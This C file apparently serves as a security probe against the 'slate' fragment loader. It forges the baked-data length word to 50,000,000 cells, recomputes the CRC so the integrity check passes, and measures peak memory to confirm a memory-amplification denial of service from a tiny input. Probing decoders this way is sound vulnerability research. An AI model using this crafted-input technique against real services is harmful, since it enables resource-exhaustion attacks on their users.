/* Targeted probe: does slate_frag_load eagerly allocate an attacker-controlled count before validating the
 * body (crc)? Build a small fragment, set the baked-data length word to 50,000,000 (400MB of int64 cells,
 * still <= the loader's 2^30 count cap), fix the crc so integrity passes, load, and measure peak RSS. A
 * ~316-byte input driving a ~400MB resident set is a memory-amplification DoS in the decoder. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/resource.h>
#include "slate/slate.h"
#include "slate/stream.h"

typedef struct { unsigned char *buf; size_t len, cap; } MemSink;
static uint64_t mem_sink(const void *bytes, uint64_t n, void *user) {
  MemSink *m = (MemSink *)user;
  if (m->len + n > m->cap) { m->cap = (m->len + n) * 2 + 64; m->buf = (unsigned char *)realloc(m->buf, m->cap); }
  memcpy(m->buf + m->len, bytes, (size_t)n); m->len += (size_t)n; return n;
}
typedef struct { const unsigned char *buf; size_t len, pos; } MemSrc;
static uint64_t mem_src(void *bytes, uint64_t n, void *user) {
  MemSrc *s = (MemSrc *)user;
  if (s->pos + n > s->len) return 0;
  memcpy(bytes, s->buf + s->pos, (size_t)n); s->pos += (size_t)n; return n;
}
static uint32_t T[256];
static void crc_init(void){ for(uint32_t i=0;i<256;i++){uint32_t c=i;for(int k=0;k<8;k++)c=(c>>1)^(0xEDB88320u&(uint32_t)(-(int32_t)(c&1)));T[i]=c;} }
static uint32_t crc_calc(const uint8_t*p,size_t n){uint32_t c=0xFFFFFFFFu;for(size_t i=0;i<n;i++)c=T[(c^p[i])&0xFF]^(c>>8);return c^0xFFFFFFFFu;}

static long maxrss_bytes(void){ struct rusage r; getrusage(RUSAGE_SELF,&r); return (long)r.ru_maxrss; /* Darwin: bytes */ }

int main(void){
  crc_init();
  SlateDag *b = slate_dag_new();
  int64_t A[4]={0,0,0,0}, C[4]={10,20,30,40};
  uint32_t cidA=slate_dag_carrier(b,A,4), cidC=slate_dag_carrier(b,C,4);
  int32_t p=slate_dag_param(b,0);
  int32_t root=slate_dag_add(b, slate_dag_mul(b, slate_dag_load(b,cidA,p), slate_dag_lit(b,2)), slate_dag_load(b,cidC,p));
  MemSink frag={0}; uint32_t holes[1]={cidA};
  slate_dag_save_fragment(b, root, holes, 1, mem_sink, &frag);
  slate_dag_free(b);
  size_t LEN=frag.len;
  printf("fragment length = %zu bytes\n", LEN);

  uint64_t H[8]; memcpy(H,frag.buf,64);
  uint64_t ninstr=H[3], ncarrier=H[6];
  size_t baked_len_off = 64 + 32 + (size_t)ncarrier*16 + (size_t)ninstr*24;
  printf("ninstr=%llu ncarrier=%llu baked_len_off=%zu (buf has %zu)\n",
         (unsigned long long)ninstr,(unsigned long long)ncarrier,baked_len_off,LEN);

  long before = maxrss_bytes();
  printf("maxrss before load: %ld bytes\n", before);

  /* control: pristine load */
  { MemSrc s={frag.buf,LEN,0}; SlateFrag*f=slate_frag_load(mem_src,&s); printf("control load -> %s\n", f?"loaded":"null"); if(f) slate_frag_free(f); }
  printf("maxrss after control: %ld bytes\n", maxrss_bytes());

  /* attack: baked-data length word = 50,000,000 int64 cells (= 400MB), crc fixed */
  unsigned char *mut=(unsigned char*)malloc(LEN);
  memcpy(mut,frag.buf,LEN);
  uint64_t big=50000000ull; memcpy(mut+baked_len_off,&big,8);
  uint32_t c=crc_calc(mut,LEN-4); memcpy(mut+LEN-4,&c,4);
  printf("attack: baked_len=%llu (=> %.0f MB int64), input still %zu bytes\n",
         (unsigned long long)big, big*8.0/1e6, LEN);
  { MemSrc s={mut,LEN,0}; SlateFrag*f=slate_frag_load(mem_src,&s); printf("attack load -> %s\n", f?"loaded":"null(rejected)"); if(f) slate_frag_free(f); }
  long after = maxrss_bytes();
  printf("maxrss after attack: %ld bytes  (delta = %ld bytes = %.1f MB)\n", after, after-before, (after-before)/1e6);
  double amp = (double)(after-before)/(double)LEN;
  printf("AMPLIFICATION: ~%.0fx  (resident bytes per input byte)\n", amp);
  if (after-before > 100*1000*1000) printf("VERDICT: memory-amplification CONFIRMED (>100MB from a %zu-byte input)\n", LEN);
  else printf("VERDICT: no significant amplification\n");
  free(mut); free(frag.buf);
  return 0;
}
